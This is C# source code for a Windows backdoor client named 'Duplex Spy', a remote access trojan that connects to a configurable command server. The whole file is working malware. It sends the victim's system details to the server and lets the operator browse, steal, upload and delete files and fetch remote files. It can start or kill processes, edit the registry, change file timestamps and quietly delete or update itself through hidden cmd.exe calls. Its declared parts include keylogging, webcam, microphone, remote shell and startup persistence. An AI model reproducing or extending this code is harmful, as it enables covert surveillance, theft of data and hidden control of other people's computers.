/* .o0o.--------------[ README ]--------------.o0o.
 * # INTRODUCTION
 * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V1.0.0
 * AUTHOR: ISSAC
 * LANGUAGE: C#
 * 
 * # DONE
 * SEND INFORMATION
 * 
 * 
 * [ TODO LIST ]
 * KEYLOGGER
 * REMOTE PLUGIN
 * 
 * REMOTE DESKTOP
 * 
 * FILE MANAGER
 * TASK MANAGER
 * CONNECTION MANAGER
 * SERVICE MANAGER
 * WINDOW MANAGER
 * 
 * [ END OF TODO LIST ]
 * 
 * .o0o.--------------[ README ]--------------.o0o. */

using AForge.Video;
using AForge.Video.DirectShow;

using Microsoft.Win32;
using Plugin.Abstractions48;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public partial class Form1 : Form
    {
        private string[] m_args;
        clsfnXterm m_fnXterm;
        clsPluginMgr m_pluginMgr;

        public Form1(string[] args)
        {
            InitializeComponent();

            m_args = args;
        }

        class PacketWriter
        {
            private readonly string file_path;
            private readonly ConcurrentQueue<(long Index, byte[] Data)> packet_queue;
            private readonly SemaphoreSlim file_lock;
            private bool is_processing;
            public long file_bytes = 0;
            private long file_len;
            private Victim v;

            public PacketWriter(string file_path, long file_len, Victim v)
            {
                this.file_path = file_path;
                this.file_len = file_len;
                this.v = v;

                packet_queue = new ConcurrentQueue<(long, byte[])>();
                file_lock = new SemaphoreSlim(1, 1);
                is_processing = false;

                if (!File.Exists(file_path))
                {
                    string dir = Path.GetDirectoryName(file_path);
                    if (!Directory.Exists(dir))
                        Directory.CreateDirectory(dir);

                    File.WriteAllBytes(file_path, new byte[0]); //CREATE NEW EMPTY FILE
                }
                else
                {
                    return;
                }

                this.v = v;
            }

            public void EnqueuePacket(long idx, byte[] data)
            {
                packet_queue.Enqueue((idx, data));
                ProcessQueue();
            }

            private void ProcessQueue()
            {
                if (is_processing)
                    return;

                is_processing = true;

                //LOCK
                Task.Run(async () =>
                {
                    while (packet_queue.TryDequeue(out var packet))
                    {
                        await file_lock.WaitAsync();
                        try
                        {
                            WritePacketIntoFile(packet.Index, packet.Data);
                        }
                        finally
                        {
                            file_bytes += packet.Data.Length;
                            CheckCompleted();
                            file_lock.Release();
                        }
                    }
                    is_processing = false;
                });
            }

            private void WritePacketIntoFile(long idx, byte[] data)
            {
                using (var fs = new FileStream(file_path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Read))
                {
                    fs.Seek(idx, SeekOrigin.Begin);
                    fs.Write(data, 0, data.Length);
                }
            }

            private void CheckCompleted()
            {
                bool done = file_bytes >= file_len;
                string data = string.Join("|", new string[]
                {
                    "file",
                    "uf",
                    "state",
                    Crypto.b64E2Str(file_path),
                    done ? "OK" : ((float)(file_bytes * 100 / file_len)).ToString("F2") + " %",
                });

                v.SendCommand(data);
                if (done)
                {
                    g_packetwriter.Remove(file_path);
                }
            }
        }

        #region Configuration

        //SOCKET CONNECTION
        private string ip = "[IP]";
        private int port = int.Parse("[PORT]"); //5000;
        private int time_reconnect = int.Parse("[RETRY]"); //1000; //ms
        private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; //ms
        private int dwTimeout = int.Parse("[TIMEOUT]"); //100000; //ms
        private bool send_screen = true;
        private string id_prefix = "[PREFIX]";
        private string id_hardware = string.Empty;

        private enMethod m_method { get; set; }

        public enum enMethod
        {
            TCP,
            TLS,
        }

        private ClientConfig clntConfig;

        //PAYLOAD
        private string file_copy;

        private bool anti_process = false;

        //Install
        private bool m_bCopyDir = bool.Parse("[IS_CP_DIR]");
        private string m_szCopyDir = "[IS_SZ_DIR]"; //Dir name (path or path variable)
        private bool m_bCopyStartUp = bool.Parse("[IS_CP_STARTUP]");
        private string m_szCopyStartUp = "[IS_SZ_STARTUP]"; //Filename
        private bool m_bReg = bool.Parse("[IS_REG]");
        private string m_szRegKeyName = "[IS_REG_KEY]"; //Registry key name

        //Misc
        private string m_szKeylogFileName = "[KL_FILE]";
        private bool m_bMsgbox = bool.Parse("[MB_ENABLE]");
        private string m_szMbCaption = "[MB_CAPTION]";
        private string m_szMbText = "[MB_TEXT]";
        private MessageBoxButtons m_mbButton = MessageBoxButtons.OK; //(MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), "[MB_BTN]");
        private MessageBoxIcon m_mbIcon = MessageBoxIcon.Error; //(MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), "[MB_ICON]");

        #endregion

        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static bool is_connected = false;

        //STORAGE
        List<frmLockScreen> fs = new List<frmLockScreen>();
        static Dictionary<string, PacketWriter> g_packetwriter = new Dictionary<string, PacketWriter>();
        List<frmLockScreen> l_frmLockScreen = new List<frmLockScreen>();

        //FUN STUFF
        static bool msg_inf = false;

        //REMOTE DESKTOP
        static bool send_screenshot = false;
        static bool send_stopped = true;
        private int m_nDesktopDelay = 100;

        //MANAGER
        private FuncInfo.PC funcInfoPC;
        private FuncInfo.Client funcInfoClient;
        private AntiProcess funcAntiProcess;
        private FuncFile funcFile;
        private FuncTask funcTask;
        private FuncReg funcReg;
        private FuncConn funcConn;
        private FuncWindow funcWindow;
        static KeyLogger keylogger;
        private Keyboard keyboard;
        private FuncMouse funcMouse;
        private RemoteShell funcShell;
        private MicAudio funcMicAudio;
        private AudioPlayer funcAudioPlayer;
        private FuncSystem funcSystem;
        private FuncServ funcServ;
        private FuncRunScript funcRunScript;
        private FuncFun funcFun;
        private Installer installer;

        //WEBCAM
        static Webcam webcam;
        static Webcam mulcam;
        private int m_nWebcamDelay = 100;

        //OTHER
        PacketWriter packet_writer;

        static byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }
        private byte[] StructToBytes<T>(T structure) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            byte[] buffer = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(structure, ptr, false);
                Marshal.Copy(ptr, buffer, 0, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return buffer;
        }
        private T BytesToStruct<T>(byte[] buffer) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            if (buffer.Length != size)
            {
                throw new ArgumentException("Byte array size does not match the size of the structure.");
            }

            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.Copy(buffer, 0, ptr, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return Marshal.PtrToStructure<T>(ptr);
        }

        /// <summary>
        /// Process all data from server.
        /// </summary>
        /// <param name="v"></param>
        void Received(Victim v)
        {
            try
            {
                Socket socket = v.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                v.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                    recv_len = v.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);

                            if (dsp.Command == 0)
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {
                                    Disconnect();
                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {
                                    Reconnect();
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    v.key_pairs.public_key = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    v._AES.key = Convert.FromBase64String(aes.key);
                                    v._AES.iv = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    v.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                    payload = Crypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
                                    v.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    new Thread(() => SendInfo(v)).Start();
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
                                    _Received(v, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    v.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                is_connected = false;
                return;
            }
        }
        /// <summary>
        /// Process function data from server.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="msg"></param>
        void _Received(Victim v, string msg)
        {
            try
            {
                //Split received string
                string[] cmd = msg.Split('|');

                #region Detail

                if (cmd[0] == "detail")
                {
                    if (cmd[1] == "client")
                    {
                        if (funcInfoClient == null)
                            funcInfoClient = new FuncInfo.Client();

                        if (cmd[2] == "info")
                        {
                            Dictionary<string, string> dic = new Dictionary<string, string>
                            {
                                { "ID", clntConfig.szOnlineID },
                                { "bAntiProc", clntConfig.bKillProcess ? "1" : "0" },
                                { "lsAntiProc", string.Join(",", clntConfig.ls_szKillProcess) },
                                { "dwRetry", clntConfig.dwRetry.ToString() },
                                { "dwSendInfo", clntConfig.dwSendInfo.ToString() },
                                { "dwTimeout", clntConfig.dwTimeout.ToString() },
                            };

                            string szPayload = string.Join(";", dic.Select(x => $"{x.Key}:{dic[x.Key]}").ToArray());
                            v.SendCommand($"detail|client|info|{szPayload}");
                        }
                        else if (cmd[2] == "set")
                        {
                            string szPayload = cmd[3];
                            foreach (string item in szPayload.Split(';'))
                            {
                                string[] split = item.Split(':');
                                switch (split[0])
                                {
                                    case "ID":
                                        clntConfig.szOnlineID = split[1];
                                        break;
                                    case "bAntiProc":
                                        clntConfig.bKillProcess = split[1] == "1";
                                        break;
                                    case "lsAntiProc":
                                        clntConfig.ls_szKillProcess = split[1].Split(',').ToList();
                                        break;
                                    case "dwRetry":
                                        clntConfig.dwRetry = int.Parse(split[1]);
                                        break;
                                    case "dwSendInfo":
                                        clntConfig.dwSendInfo = int.Parse(split[1]);
                                        break;
                                    case "dwTimeout":
                                        clntConfig.dwTimeout = int.Parse(split[1]);
                                        break;
                                }
                            }

                            v.socket.ReceiveTimeout = clntConfig.dwTimeout;
                            v.socket.SendTimeout = clntConfig.dwTimeout;

                            //Enable or disable some function.
                            if (funcAntiProcess == null)
                            {
                                funcAntiProcess = new AntiProcess();
                                funcAntiProcess.fake_msg = true;
                            }

                            if (clntConfig.bKillProcess)
                                funcAntiProcess.Start(clntConfig.ls_szKillProcess);
                            else
                                funcAntiProcess.Stop();
                        }
                    }
                    else if (cmd[1] == "pc")
                    {
                        if (funcInfoPC == null)
                            funcInfoPC = new FuncInfo.PC();

                        if (cmd[2] == "info")
                        {
                            ClientInfo info = new ClientInfo();

                            string szPayload = $"" +
                                $"[Client]\n" +
                                $"Online ID: {clntConfig.szOnlineID}\n" +
                                $"Username: {info.szUsername}\n" +
                                $"Process: {info.szCurrentProcName}\n" +
                                $"Hostname: {info.szDnsHostName}\n" +
                                $"StartUp: {info.szStartupPath}\n" +
                                $"OS: {info.szOS}\n" +
                                $"\n" +
                                $"[User]\n" +
                                $"Monitor[{info.ls_Monitor.Count}]: [{string.Join(", ", info.ls_Monitor)}]\n" +
                                $"Webcam[{info.ls_Webcam.Count}]: [{string.Join(", ", info.ls_Webcam)}]\n" +
                                $"\n" +
                                $"[Hardware]\n" +
                                $"Machine Name: {info.szMachineName}\n" +
                                $"";

                            v.SendCommand("detail|pc|info|basic|" + Crypto.b64E2Str(szPayload));

                            DataTable dt = funcInfoPC.GetPatch();
                            szPayload = $"{string.Join(",", dt.Columns.Cast<DataColumn>().Select(x => x.ColumnName).ToArray())}|{string.Join(";", dt.Rows.Cast<DataRow>().Select(x => string.Join(",", x.ItemArray.Select(y => y.ToString()))))}";

                            v.SendCommand("detail|pc|info|patch|" + szPayload);
                        }
                    }
                }

                #region Client

                else if (cmd[0] == "clnt")
                {
                    if (cmd[1] == "rm") //Remove
                    {
                        /* 1. Remove itself from registry key.
                         * 2. Kill itself.
                         * 3. Self-delete.
                         * 4. Delete keylogger file.
                         */

                        if (installer.m_bReg)
                            installer.RegRemove();

                        string szExePath = Process.GetCurrentProcess().MainModule.FileName;
                        string szKeylogFile = keylogger == null ? null : keylogger.file_keylogger;
                        string szCmd = $"/C ping 127.0.0.1 -n 2 > nul & del \"{szExePath}\"";
                        if (!string.IsNullOrEmpty(szKeylogFile))
                            szCmd += $" & del \"{szKeylogFile}\"";

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = szCmd,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });

                        Environment.Exit(0);
                    }
                    else if (cmd[1] == "sl") //Sleep
                    {
                        /* 1. Kill itself
                         * 2. Restart
                         */

                        int nSec = int.Parse(cmd[2]);
                        string szExePath = Process.GetCurrentProcess().MainModule.FileName;
                        string szCmd = $"/C ping 127.0.0.1 -n \"{nSec + 1}\" > nul && \"{szExePath}\"";

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = szCmd,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden,
                        });

                        Environment.Exit(0);
                    }
                    else if (cmd[1] == "ud") //Update
                    {
                        int nCode = 0;
                        string szMsg = string.Empty;

                        try
                        {

                            bool bChangeName = cmd[2] == "1";
                            string szFileName = Path.Combine(Application.StartupPath, Crypto.b64D2Str(cmd[3]));
                            byte[] abFileBuffer = Convert.FromBase64String(cmd[4]);

                            string szTmpFile = Path.GetTempFileName();
                            string szExeFile = bChangeName ? szFileName : Process.GetCurrentProcess().MainModule.FileName;

                            File.WriteAllBytes(szTmpFile, abFileBuffer);

                            string szCmd = $"/C ping 127.0.0.1 -n 3 > nul & copy /Y \"{szTmpFile}\" \"{szExeFile}\" & del \"{szTmpFile}\" & start \"{szExeFile}\"";
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = szCmd,
                                CreateNoWindow = true,
                                WindowStyle = ProcessWindowStyle.Hidden,
                            });

                            nCode = 1;

                            Environment.Exit(0);
                        }
                        catch (Exception ex)
                        {
                            szMsg = ex.Message;
                        }
                    }
                }

                #endregion

                #endregion
                #region FileMgr

                else if (cmd[0] == "file")
                {
                    if (funcFile == null)
                        funcFile = new FuncFile();

                    if (cmd[1] == "init")
                    {
                        string cp = funcFile.cp;
                        //string driver_info = funcFile.GetDrives();
                        DriveInfo[] drives = funcFile.GetDrives();
                        List<string> lsDrives = new List<string>();
                        foreach (DriveInfo drive in drives)
                        {
                            try
                            {
                                lsDrives.Add(string.Join(",", new string[]
                                {
                                    drive.Name.Replace("\\", string.Empty),
                                    drive.DriveType.ToString(),
                                    funcFile.BytesNormalize(drive.TotalSize),
                                    funcFile.BytesNormalize(drive.AvailableFreeSpace),
                                    drive.VolumeLabel,
                                }));
                            }
                            catch (Exception ex)
                            {

                            }
                        }
                        string driver_info = string.Join("-", lsDrives.ToArray());
                        string strShortCuts = string.Join(",", funcFile.ScanShortCut().Select(x => Crypto.b64E2Str(x)).ToArray());
                        string info = string.Join(",", funcFile.FileMgrInfo().Select(x => Crypto.b64E2Str(x)).ToArray());
                        v.SendCommand($"file|init|{cp}|{driver_info}|{strShortCuts}|{info}");
                    }
                    else if (cmd[1] == "sd") //SCAN DIR
                    {
                        string dir = cmd[2];
                        int dir_limit = int.Parse(cmd[3]);
                        int file_limit = int.Parse(cmd[4]);
                        var val = funcFile.ScanDir(dir, dir_limit, file_limit);

                        int code = val.Item1;
                        string szRet = val.Item2;
                        List<string[]> l_dir = val.Item3;
                        List<string[]> l_file = val.Item4;

                        string data = string.Join("+", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("+", l_file.Select(x => string.Join(";", x))); //funcFile.ScanDir(dir, dir_limit, file_limit);
                        if (data.Contains("|"))
                        {
                            string[] dataSplit = data.Split('|');
                            if (dataSplit[0] == "0")
                            {
                                v.SendCommand($"file|sd|error|{dataSplit[1]}");
                                return;
                            }
                        }

                        v.SendCommand($"file|sd|" + dir + "|" + data);
                    }
                    else if (cmd[1] == "goto") //GOTO DIRECTORY
                    {
                        var x = funcFile.Goto(Crypto.b64D2Str(cmd[2]));
                        v.SendCommand($"file|goto|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "read")
                    {
                        v.SendCommand($"file|read|" + funcFile.ReadFile(cmd[2]));
                    }
                    else if (cmd[1] == "write")
                    {
                        string path = Crypto.b64D2Str(cmd[2]);
                        string text = Crypto.b64D2Str(cmd[3]);

                        v.encSend(2, 0, "file|write|" + funcFile.WriteFile(path, text));
                    }
                    else if (cmd[1] == "paste") //PASTE
                    {
                        if (cmd[2] == "cp" || cmd[2] == "mv")
                        {
                            string[] folders = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                            string[] files = cmd[4].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                            string dir_dst = Crypto.b64D2Str(cmd[5]);

                            v.encSend(2, 0, "file|paste|" + funcFile.PasteItems(folders, files, dir_dst, cmd[2] == "mv"));
                        }
                    }
                    else if (cmd[1] == "del") //DELETE
                    {
                        int thd_cnt = int.Parse(cmd[2]);
                        string[] folders = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] files = cmd[4].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                        v.encSend(2, 0, "file|del|" + funcFile.DeleteItems(folders, files));
                    }
                    else if (cmd[1] == "uf") //UPLOAD FILE
                    {
                        string szFlag = cmd[2];
                        if (szFlag == "single")
                        {
                            if (cmd[3] == "recv")
                            {
                                string filename = Crypto.b64D2Str(cmd[4]); //WRITE BYTES PATH
                                string szDirName = Path.GetDirectoryName(filename);

                                if (!Directory.Exists(szDirName))
                                    Directory.CreateDirectory(szDirName);

                                long file_len = long.Parse(cmd[5]);
                                int idx = int.Parse(cmd[6]);
                                byte[] data = Convert.FromBase64String(cmd[7]);

                                if (!g_packetwriter.ContainsKey(filename))
                                    g_packetwriter.Add(filename, new PacketWriter(filename, file_len, v));

                                PacketWriter writer = g_packetwriter[filename];
                                writer.EnqueuePacket(idx, data);
                            }
                            else if (cmd[3] == "stop")
                            {

                            }
                        }
                        else if (szFlag == "mult")
                        {

                        }
                    }
                    else if (cmd[1] == "df") //DOWNLOAD FILE
                    {
                        if (cmd[2] == "send")
                        {
                            string[] files = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                            new Thread(() => funcFile.Download(files, v)).Start();
                        }
                        else if (cmd[2] == "pause")
                        {
                            funcFile.g_bDownloadPause = true;
                        }
                        else if (cmd[2] == "resume")
                        {
                            funcFile.g_bDownloadPause = false;
                        }
                        else if (cmd[2] == "stop")
                        {
                            funcFile.g_bDownloadPause = false;
                            funcFile.g_bDownloadFile = false;
                        }
                    }
                    else if (cmd[1] == "zip")
                    {
                        string[] folders = cmd[2].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] files = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string archiveName = cmd[4];

                        (List<string[]> dInfo, List<string[]> fInfo) = funcFile.Archive_Compress(folders, files, archiveName);

                        v.encSend(2, 0, string.Join("|", new string[]
                        {
                            "file",
                            "zip",

                            //Folder State.
                            string.Join(",",
                                dInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),

                            //File State.
                            string.Join(",",
                                fInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),

                            //Archive Path
                            archiveName,
                        }));
                    }
                    else if (cmd[1] == "unzip")
                    {
                        int method = int.Parse(cmd[2]);
                        string[] archives = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string dirName = cmd[4];
                        bool delete = int.Parse(cmd[5]) == 1;

                        List<string[]> aInfo = funcFile.Archive_Extract(archives, dirName, method, delete);

                        v.encSend(2, 0, string.Join("|", new string[]
                        {
                            "file",
                            "unzip",

                            //Archive State.
                            string.Join(",",
                                aInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),
                        }));
                    }
                    else if (cmd[1] == "img")
                    {
                        List<string> data = funcFile.ShowImage(v, cmd[2]);
                        v.encSend(2, 0, $"file|img|" + string.Join(",", data.ToArray()));
                    }
                    else if (cmd[1] == "new")
                    {
                        if (cmd[2] == "folder")
                        {
                            try { Directory.CreateDirectory(Crypto.b64D2Str(cmd[3])); v.encSend(2, 0, "file|new|folder|1|"); }
                            catch (Exception ex) { v.encSend(2, 0, "file|new|folder|0|" + Crypto.b64E2Str(ex.Message)); }
                        }
                    }
                    else if (cmd[1] == "find")
                    {
                        string[] paths = cmd[2].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] patterns = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                        int method = int.Parse(cmd[4]);
                        bool bIgnoreCase = int.Parse(cmd[5]) == 1;
                        int itemType = int.Parse(cmd[6]);

                        List<(string, string)> results = funcFile.Find(paths, patterns, method, bIgnoreCase, itemType);

                        //Generate Payload
                        results = results.Select(x => (x.Item1, Crypto.b64E2Str(x.Item2))).ToList();
                        v.SendCommand(string.Join("|", new string[]
                        {
                            "file",
                            "find",
                            string.Join(";", results.Select(x => $"{x.Item1},{x.Item2}").ToArray()),
                        }));
                    }
                    else if (cmd[1] == "wget")
                    {
                        string szUrl = Crypto.b64D2Str(cmd[2]);
                        string szCurrentDir = Crypto.b64D2Str(cmd[3]);
                        var x = funcFile.Wget(v, szUrl, szCurrentDir);

                        v.SendCommand($"file|wget|status|{cmd[2]}|{Crypto.b64E2Str(x.Item3)}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "ts") //File Timestamp
                    {
                        bool bIsFile = cmd[2] == "1";
                        string szFilePath = Crypto.b64D2Str(cmd[3]);
                        EntityTimestampType etType = (EntityTimestampType)int.Parse(cmd[4]);
                        DateTime time = DateTime.Parse(Crypto.b64D2Str(cmd[5]));

                        var x = funcFile.fnSetEntityTimestamp(bIsFile, szFilePath, etType, time);

                        v.SendCommand($"file|ts|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                    }
                    else if (cmd[1] == "sc") //ShortCut
                    {
                        var scType = cmd[2] == "file" ? ShortCutsType.File : ShortCutsType.URL;
                        string[] foo = new string[] { cmd[3], cmd[4], cmd[5] }.Select(s => Crypto.b64D2Str(s)).ToArray();
                        string szSrc = foo[0];
                        string szDest = foo[1];
                        string szDesc = foo[2];

                        var x = funcFile.fnCreateShortCuts(scType, szSrc, szDest, szDesc);

                        v.SendCommand($"file|sc|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                    }
                }

                #endregion
                #region TaskMgr
                else if (cmd[0] == "task")
                {
                    if (funcTask == null)
                        funcTask = new FuncTask();

                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "task|init|" + data);
                    }
                    else if (cmd[1] == "start")
                    {
                        string szFileName = Crypto.b64D2Str(cmd[2]);
                        string szArgv = Crypto.b64D2Str(cmd[3]);
                        string szWorkDir = Crypto.b64D2Str(cmd[4]);

                        var x = funcTask.Start(szFileName, szArgv, szWorkDir);

                        v.SendCommand($"task|start|{cmd[2]}|{cmd[3]}|{cmd[4]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "kill")
                    {
                        int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
                        foreach (int pid in pids)
                        {
                            var x = funcTask.Kill(pid);
                            lsResult.Add((pid, x.Item1, x.Item2));
                        }

                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{Crypto.b64E2Str(x.Item3)}"));
                        v.SendCommand($"task|kill|{payload}");
                    }
                    else if (cmd[1] == "kd") //KILL & DELETE
                    {
                        int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
                        foreach (int pid in pids)
                        {
                            var x = funcTask.KillDelete(pid);
                            lsResult.Add((pid, x.Item1, x.Item2));
                        }

                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{Crypto.b64E2Str(x.Item3)}"));
                        v.SendCommand($"task|resume|{payload}");
                    }
                    else if (cmd[1] == "resume")
                    {
                        int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
                        foreach (int pid in pids)
                        {
                            var x = funcTask.Resume(pid);
                            lsResult.Add((pid, x.Item1, x.Item2));
                        }

                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{Crypto.b64E2Str(x.Item3)}"));
                        v.SendCommand($"task|resume|{payload}");
                    }
                    else if (cmd[1] == "suspend")
                    {
                        int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
                        foreach (int pid in pids)
                        {
                            var x = funcTask.Suspend(pid);
                            lsResult.Add((pid, x.Item1, x.Item2));
                        }

                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{Crypto.b64E2Str(x.Item3)}"));
                        v.SendCommand($"task|suspend|{payload}");
                    }
                }
                #endregion
                #region RegEdit
                else if (cmd[0] == "reg") //REGISTRY
                {
                    if (funcReg == null)
                        funcReg = new FuncReg();

                    if (cmd[1] == "init") //INITIALIZATION
                    {
                        string data = funcReg.GetRootKeys();
                        v.encSend(2, 0, "reg|init|" + data);
                    }
                    else if (cmd[1] == "item") //SCAN DIRECTORY
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|item|{Path.Combine(cmd[2], path)}|" + funcReg.GetItems(cmd[2], path));
                    }
                    else if (cmd[1] == "goto") //CHECK SPECIFIED PATH EXISTED
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|goto|{Crypto.b64E2Str(Path.Combine(cmd[2], path))}|" + (funcReg.Goto(cmd[2], path) ? "1" : "0"));
                    }
                    else if (cmd[1] == "add")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);
                        string itemName = Crypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.AddNewKey(regFullPath, itemName);
                            v.SendCommand($"reg|add|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[5]);
                            var result = funcReg.AddNewValue(regFullPath, itemName, kind);
                            v.SendCommand($"reg|add|val|{result.Item1}|{result.Item2}");
                        }
                    }
                    else if (cmd[1] == "rename")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);
                        string srcPath = Crypto.b64D2Str(cmd[4]);
                        string dstPath = Crypto.b64D2Str(cmd[5]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.RenameKey(srcPath, dstPath);
                            v.SendCommand($"reg|rename|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            var x = funcReg.RenameValue(regFullPath, srcPath, dstPath);
                            v.SendCommand($"reg|rename|val|{x.Item1}|{x.Item2}");
                        }
                    }
